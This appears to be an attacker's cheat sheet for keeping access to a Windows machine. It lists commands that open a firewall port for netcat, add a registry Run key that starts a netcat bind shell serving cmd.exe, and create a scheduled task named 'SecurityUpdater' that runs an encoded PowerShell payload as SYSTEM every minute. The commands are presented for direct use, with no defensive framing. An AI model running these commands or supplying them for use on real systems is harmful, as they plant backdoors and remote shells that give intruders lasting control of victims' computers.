# cmd.exe
% windows, persistence

#plateform/windows #target/local #cat/PERSIST #tag/cmd 

# registry bind listener
netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=4445
```
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v <name> -d 'C:\windows\temp\nc.exe -Ldp <port> -e cmd.exe'
```

# scheduled tasks
netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=4445
```
schtasks /create /sc minute /mo 1 /tn SecurityUpdater /tr \"powershell.exe -enc <payload_b64_enc>" /ru SYSTEM
```